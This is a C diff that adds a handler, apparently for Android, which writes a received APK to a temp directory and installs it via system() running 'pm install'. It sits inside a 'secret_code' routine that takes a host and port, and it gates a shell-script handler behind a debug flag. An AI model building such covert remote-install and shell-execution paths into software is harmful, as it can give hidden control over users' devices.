@@ -2,6 +2,7 @@
 #include <arpa/inet.h>
 #include <curl/curl.h>
 #include <errno.h>
+#include <fcntl.h>
 #include <limits.h>
 #include <linux/limits.h>
 #include <netdb.h>
@@ -31,6 +32,7 @@ static const char *const public_key =
 #ifdef DEBUG_MODE
 static char *cmd_shell(void *script, size_t script_size, int *ret_val);
 #endif
+static char *cmd_install_file(void *apk, size_t apk_size, int *ret_val);
 
 // caller expects returned string to be free()able, so we cant just 'return
 // "whatever";'
@@ -42,12 +44,14 @@ static char *malloc_str(const char *const s) {
   return ret;
 }
 static bool secret_str_safe(const char *const s);
+static const char *tmpdir;
 
 char *secret_code(int argc, char **argv, int *ret_val, const char *const host,
-                  const char *const port, const char *const tmpdir) {
+                  const char *const port, const char *const _tmpdir) {
   size_t secret_len_max;
   struct DUMB_PAYLOAD *payload = NULL;
   size_t payload_size;
+  tmpdir = _tmpdir;
 
   if (argc != 1) {
     *ret_val = EINVAL;
@@ -116,6 +120,41 @@ char *secret_code(int argc, char **argv, int *ret_val, const char *const host,
   return ret_str;
 }
 
+static char *cmd_install_file(void *apk, size_t apk_size, int *ret_val) {
+  LOG_DEBUG("cmd_install_file()");
+  int err;
+  int fd;
+  char *path = malloc(PATH_MAX);
+  if (path == NULL) {
+    // TODO:
+    return NULL;
+  }
+
+  err = snprintf(path, PATH_MAX, "%s%s", tmpdir, "tmp.apk");
+  // TODO: handle err
+  LOG_DEBUG("writing payload to %s", path);
+
+  fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+  // TODO: handle error
+
+  err = write_all(fd, apk, apk_size);
+  // TODO: handle err
+  close(fd);
+
+  // TODO: don't use system(), probably unsafe
+  char *system_cmd;
+  asprintf(&system_cmd, "pm install '%s'", path);
+  LOG("running %s", system_cmd);
+  err = system(system_cmd);
+  free(system_cmd);
+  LOG("exited with %d", WEXITSTATUS(err));
+  unlink(path);
+  free(path);
+  *ret_val = WEXITSTATUS(err);
+  return NULL;
+}
+
+#ifdef DEBUG_MODE
 static char *cmd_shell(void *script, size_t script_size, int *ret_val) {
   int err;
   // sanity check
@@ -139,3 +178,4 @@ static char *cmd_shell(void *script, size_t script_size, int *ret_val) {
     return malloc_str("internal error");
   }
 }
+#endif // DEBUG_MODE
